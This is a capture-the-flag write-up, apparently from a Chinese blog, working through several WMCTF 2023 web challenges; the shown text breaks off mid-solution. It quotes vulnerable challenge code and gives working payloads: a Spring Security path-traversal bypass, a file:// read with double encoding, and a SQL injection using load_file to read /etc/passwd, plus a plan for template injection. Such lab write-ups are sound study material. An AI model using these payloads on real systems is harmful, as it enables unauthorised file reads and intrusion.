<!DOCTYPE html><html lang="zh-CN" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>WMCTF 2023 | gh0st's blog</title><meta name="keywords" content="wmctf,主从复制"><meta name="author" content="gh0st"><meta name="copyright" content="gh0st"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="WMCTF 2023AnyFileRead&#x2F;path可读任意文件，且没有限制  SpringScurity的简单绕过，注意编码问题 1&#x2F;admin&#x2F;..&#x2F;flag   ez_java_agagin源码里有 1&lt;!--  &lt;link rel&#x3D;&quot;Shortcut Icon&quot; href&#x3D;&quot;.&#x2F;Imagefile?url1&#x3D;upload&#x2F;favicon.ico&amp;q">
<meta property="og:type" content="article">
<meta property="og:title" content="WMCTF 2023">
<meta property="og:url" content="https://gh0st.com.cn/2023/08/22/wmctf/index.html">
<meta property="og:site_name" content="gh0st&#39;s blog">
<meta property="og:description" content="WMCTF 2023AnyFileRead&#x2F;path可读任意文件，且没有限制  SpringScurity的简单绕过，注意编码问题 1&#x2F;admin&#x2F;..&#x2F;flag   ez_java_agagin源码里有 1&lt;!--  &lt;link rel&#x3D;&quot;Shortcut Icon&quot; href&#x3D;&quot;.&#x2F;Imagefile?url1&#x3D;upload&#x2F;favicon.ico&amp;q">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://s1.ax1x.com/2023/08/23/pPJI5Eq.jpg">
<meta property="article:published_time" content="2023-08-22T09:10:33.000Z">
<meta property="article:modified_time" content="2023-10-02T11:15:56.059Z">
<meta property="article:author" content="gh0st">
<meta property="article:tag" content="wmctf">
<meta property="article:tag" content="主从复制">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://s1.ax1x.com/2023/08/23/pPJI5Eq.jpg"><link rel="shortcut icon" href="/img/1.png"><link rel="canonical" href="https://gh0st.com.cn/2023/08/22/wmctf/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//hm.baidu.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="baidu-site-verification" content="codeva-gudl3Q1MDd"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?616c9cb767938a90fcc5fa4c20635c46";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
</script><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: {"appId":"TQGE5RYJPT","apiKey":"f4ae611eb7599c36f354ba51803b8e85","indexName":"index","hits":{"per_page":6},"languages":{"input_placeholder":"搜索文章","hits_empty":"找不到您查询的内容：${query}","hits_stats":"找到 ${hits} 条结果，用时 ${time} 毫秒"}},
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'WMCTF 2023',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2023-10-02 19:15:56'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><link rel="stylesheet" href="/css/custom.css"><link rel="stylesheet" href="/css/universe.css"><link rel="stylesheet" href="/css/rgb.css"><meta name="generator" content="Hexo 6.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/avatar.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">36</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">28</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">8</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首頁</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 時間軸</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 標籤</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分類</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-heartbeat"></i><span> 清單</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音樂</span></a></li><li><a class="site-page child" href="/Gallery/"><i class="fa-fw fas fa-images"></i><span> 照片</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 電影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友鏈</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 關於</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://s1.ax1x.com/2022/11/20/zMWUzQ.png')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">gh0st's blog</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首頁</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 時間軸</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 標籤</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分類</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-heartbeat"></i><span> 清單</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音樂</span></a></li><li><a class="site-page child" href="/Gallery/"><i class="fa-fw fas fa-images"></i><span> 照片</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 電影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友鏈</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 關於</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">WMCTF 2023</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-08-22T09:10:33.000Z" title="发表于 2023-08-22 17:10:33">2023-08-22</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-10-02T11:15:56.059Z" title="更新于 2023-10-02 19:15:56">2023-10-02</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/competition/">competition</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="WMCTF 2023"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="WMCTF-2023"><a href="#WMCTF-2023" class="headerlink" title="WMCTF 2023"></a>WMCTF 2023</h1><h2 id="AnyFileRead"><a href="#AnyFileRead" class="headerlink" title="AnyFileRead"></a>AnyFileRead</h2><p><code>/path</code>可读任意文件，且没有限制</p>
<p><a target="_blank" rel="noopener" href="https://imgse.com/i/pPJmzHH"><img src="https://s1.ax1x.com/2023/08/22/pPJmzHH.png" alt="pPJmzHH.png"></a></p>
<p>SpringScurity的简单绕过，注意编码问题</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/admin/../flag</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://imgse.com/i/pPJnpEd"><img src="https://s1.ax1x.com/2023/08/22/pPJnpEd.png" alt="pPJnpEd.png"></a></p>
<h2 id="ez-java-agagin"><a href="#ez-java-agagin" class="headerlink" title="ez_java_agagin"></a>ez_java_agagin</h2><p>源码里有</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--  &lt;link rel=&quot;Shortcut Icon&quot; href=&quot;./Imagefile?url1=upload/favicon.ico&quot; type=&quot;image/x-icon&quot; /&gt; 存在安全问题，已废弃--&gt;</span><br></pre></td></tr></table></figure>

<p>提示</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">must contain java and not have flag</span><br></pre></td></tr></table></figure>

<p><code>/usr/share/java/</code>包含java字样，file协议读flag，flag需要二次编码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/Imagefile?url1=file:///usr/share/java/../../../../%2566%256c%2561%2567</span><br></pre></td></tr></table></figure>

<h2 id="ezblog"><a href="#ezblog" class="headerlink" title="ezblog"></a>ezblog</h2><p>用js实现了类似python debug pin码功能</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">get</span>(<span class="string">&quot;/console&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    res.<span class="title function_">render</span>(<span class="string">&quot;console&quot;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 基于Token的Session鉴权机制的编写</span></span><br><span class="line"><span class="keyword">let</span> token = (<span class="number">0</span>, uuid_1.<span class="property">v4</span>)();</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">requireAuth</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">headers</span> &amp;&amp; req.<span class="property">headers</span>.<span class="property">authorization</span> &amp;&amp; req.<span class="property">headers</span>.<span class="property">authorization</span> === token) &#123;</span><br><span class="line">        <span class="title function_">next</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        res.<span class="title function_">status</span>(<span class="number">401</span>).<span class="title function_">send</span>(&#123;</span><br><span class="line">            <span class="attr">code</span>: <span class="number">401</span>,</span><br><span class="line">            <span class="attr">message</span>: <span class="string">&quot;Unauthorized&quot;</span>,</span><br><span class="line">            <span class="attr">data</span>: <span class="string">&quot;Error: Unauthorized&quot;</span></span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// debugger</span></span><br><span class="line"><span class="comment">// 仿照 werkzeug 实现的调试器鉴权</span></span><br><span class="line"><span class="comment">// pin 是在启动时生成的，可以在控制台看到，但是不会在页面上显示，需要自己输入，这样可以防止别人直接看到密码，但是又可以让自己知道密码，方便调试</span></span><br><span class="line"><span class="keyword">let</span> pin = (<span class="number">0</span>, uuid_1.<span class="property">v4</span>)();</span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&quot;/api/debugger/auth&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> username = req.<span class="property">body</span>.<span class="property">username</span>;</span><br><span class="line">    <span class="keyword">let</span> password = req.<span class="property">body</span>.<span class="property">password</span>;</span><br><span class="line">    <span class="keyword">if</span> (username === <span class="string">&quot;debugger&quot;</span> &amp;&amp; password === pin) &#123;</span><br><span class="line">        res.<span class="title function_">json</span>(&#123;</span><br><span class="line">            <span class="attr">code</span>: <span class="number">200</span>,</span><br><span class="line">            <span class="attr">message</span>: <span class="string">&quot;OK&quot;</span>,</span><br><span class="line">            <span class="attr">data</span>: token</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        res.<span class="title function_">json</span>(&#123;</span><br><span class="line">            <span class="attr">code</span>: <span class="number">401</span>,</span><br><span class="line">            <span class="attr">message</span>: <span class="string">&quot;Error: incorrect pin&quot;</span>,</span><br><span class="line">            <span class="attr">data</span>: <span class="literal">null</span></span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>其中需要pin为随机生成的uuid，需通过某种方式获取，鉴权成功后会开启三个新功能</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// &quot;execute&quot; python where python is a kind of snake</span></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&quot;/api/debugger/python/execute&quot;</span>, requireAuth, <span class="keyword">async</span> (req, res) =&gt; &#123;</span><br><span class="line">    <span class="keyword">if</span> (python_count &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        python_count--;</span><br><span class="line">        res.<span class="title function_">json</span>(&#123;</span><br><span class="line">            <span class="attr">code</span>: <span class="number">200</span>,</span><br><span class="line">            <span class="attr">message</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">            <span class="attr">data</span>: <span class="string">&quot;Killed&quot;</span></span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        res.<span class="title function_">json</span>(&#123;</span><br><span class="line">            <span class="attr">code</span>: <span class="number">200</span>,</span><br><span class="line">            <span class="attr">message</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">            <span class="attr">data</span>: <span class="string">&quot;Error: you have killed all the snakes&quot;</span></span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">// 调试SQL语句</span></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&quot;/api/debugger/sql/execute&quot;</span>, requireAuth, <span class="keyword">async</span> (req, res) =&gt; &#123;</span><br><span class="line">    <span class="keyword">let</span> sql = req.<span class="property">body</span>.<span class="property">code</span>;</span><br><span class="line">    <span class="comment">// 防止恶意sql</span></span><br><span class="line">    <span class="keyword">const</span> waf = [<span class="string">&#x27;into&#x27;</span>, <span class="string">&#x27;outfile&#x27;</span>, <span class="string">&#x27;dumpfile&#x27;</span>];</span><br><span class="line">    <span class="keyword">let</span> filtered = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span> (waf.<span class="title function_">some</span>(<span class="function">(<span class="params">w</span>) =&gt;</span> &#123; filtered = w; <span class="keyword">return</span> sql.<span class="title function_">toLowerCase</span>().<span class="title function_">includes</span>(w); &#125;)) &#123;</span><br><span class="line">        res.<span class="title function_">json</span>(&#123;</span><br><span class="line">            <span class="attr">code</span>: <span class="number">500</span>,</span><br><span class="line">            <span class="attr">message</span>: <span class="string">&quot;Hack!!&quot;</span>,</span><br><span class="line">            <span class="attr">data</span>: <span class="string">`Error: &#x27;<span class="subst">$&#123;filtered&#125;</span>&#x27; is not allowed`</span></span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="regexp">/execute|immediate/igm</span>.<span class="title function_">test</span>(sql)) &#123;</span><br><span class="line">        res.<span class="title function_">json</span>(&#123;</span><br><span class="line">            <span class="attr">code</span>: <span class="number">500</span>,</span><br><span class="line">            <span class="attr">message</span>: <span class="string">&quot;Hack!!&quot;</span>,</span><br><span class="line">            <span class="attr">data</span>: <span class="string">`Error: 非预期 is fixed`</span></span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    db_1.<span class="property">connection</span>.<span class="title function_">query</span>(sql, <span class="function">(<span class="params">err, results, fields</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (err) &#123;</span><br><span class="line">            res.<span class="title function_">json</span>(&#123;</span><br><span class="line">                <span class="attr">code</span>: <span class="number">500</span>,</span><br><span class="line">                <span class="attr">message</span>: <span class="string">&quot;Internal Server Error&quot;</span>,</span><br><span class="line">                <span class="attr">data</span>: err?.<span class="property">message</span></span><br><span class="line">            &#125;);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        res.<span class="title function_">json</span>(&#123;</span><br><span class="line">            <span class="attr">code</span>: <span class="number">200</span>,</span><br><span class="line">            <span class="attr">message</span>: <span class="string">&quot;OK&quot;</span>,</span><br><span class="line">            <span class="attr">data</span>: results</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">// 调试模板</span></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&quot;/api/debugger/template/test&quot;</span>, requireAuth, <span class="keyword">async</span> (req, res) =&gt; &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> file = req.<span class="property">body</span>.<span class="property">file</span>;</span><br><span class="line">        <span class="comment">// 防止路径穿越造成非预期</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="regexp">/[^a-zA-Z0-9_]/gm</span>.<span class="title function_">test</span>(file)) &#123;</span><br><span class="line">            res.<span class="title function_">send</span>(<span class="string">`Error: &#x27;<span class="subst">$&#123;file&#125;</span>&#x27; is invalid name`</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">let</span> posts = <span class="keyword">await</span> (<span class="number">0</span>, posts_1.<span class="property">getPosts</span>)();</span><br><span class="line">        <span class="keyword">let</span> post = posts.<span class="property">length</span> &gt; <span class="number">0</span> ? posts[<span class="number">0</span>] : <span class="literal">null</span>;</span><br><span class="line">        res.<span class="title function_">render</span>(file, &#123;</span><br><span class="line">            post, posts</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(e));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>其中<code>/api/debugger/sql/execute</code>可执行任意sql语句，但不能出现<code>&#39;into&#39;, &#39;outfile&#39;, &#39;dumpfile&#39;</code>，<code>/api/debugger/template/test</code>可指定使用某个ejs模板进行渲染，并返回渲染后的结果。</p>
<p>思路就有了</p>
<ul>
<li>通过sql模块覆盖原有ejs模板或者写入新的ejs模板</li>
<li>在ejs模板里构造ssti，执行<code>/readflag</code></li>
<li>通过temolate模块指定渲染模板为构造的恶意模板，并返回渲染结果</li>
</ul>
<p>编辑帖子功能，id可控，含有数字就能通过正则校验，之后通过<code>getPostById</code>接收id并拼接到sql语句中</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">get</span>(<span class="string">&quot;/post/:id/edit&quot;</span>, <span class="keyword">async</span> (req, res) =&gt; &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// parseInt的性能问题 https://dev.to/darkmavis1980/you-should-stop-using-parseint-nbf</span></span><br><span class="line">        <span class="keyword">let</span> id = req.<span class="property">params</span>.<span class="property">id</span>;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="regexp">/\d+/igm</span>.<span class="title function_">test</span>(id) || <span class="regexp">/into|outfile|dumpfile/igm</span>.<span class="title function_">test</span>(id)) &#123; <span class="comment">// 判断 id是否是纯数字</span></span><br><span class="line">            res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">send</span>(<span class="string">`Error: &#x27;<span class="subst">$&#123;id&#125;</span>&#x27; is invalid id`</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// id只能为数字，可以安全的转为number，避免parseInt降低性能</span></span><br><span class="line">        <span class="keyword">let</span> post = <span class="keyword">await</span> (<span class="number">0</span>, posts_1.<span class="property">getPostById</span>)(id);</span><br><span class="line">        res.<span class="title function_">render</span>(<span class="string">&quot;edit&quot;</span>, &#123;</span><br><span class="line">            post</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">        res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">send</span>(e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getPostById</span>(<span class="params">id</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="comment">// 使用 number 类型的 id 不会导致 sql 注入，因为数字类型只有0-9的数字，无法构造sql语句</span></span><br><span class="line">        <span class="comment">// TypeScript可以确保传入类型只能为number，不能为字符串，如果为字符串，将会发生编译时错误导致tsc无法编译，所以是安全的</span></span><br><span class="line">        db_1.<span class="property">connection</span>.<span class="title function_">query</span>(<span class="string">`select * from Posts where id = `</span> + id, <span class="function">(<span class="params">err, results</span>) =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (err) &#123;</span><br><span class="line">                <span class="title function_">reject</span>(err);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (results.<span class="property">length</span> === <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="title function_">reject</span>(<span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&quot;Post not found&quot;</span>));</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="title function_">resolve</span>(&#123;</span><br><span class="line">                        <span class="attr">id</span>: results[<span class="number">0</span>].<span class="property">id</span>,</span><br><span class="line">                        <span class="attr">title</span>: results[<span class="number">0</span>].<span class="property">title</span>,</span><br><span class="line">                        <span class="attr">content</span>: results[<span class="number">0</span>].<span class="property">content</span></span><br><span class="line">                    &#125;);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>构造<code>load_file()</code>实现任意文件读取,<code>/</code>需要url编码一下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/post/-1 union select 1,load_file(&#x27;%2Fetc%2Fpasswd&#x27;),3/edit</span><br></pre></td></tr></table></figure>

<p>如何找寻pin码？</p>
<p>Dockerfile里发现题目采用<code>pm2</code>进行node进程管理，本地搭建docker发现输出了两个pm2的日志文件</p>
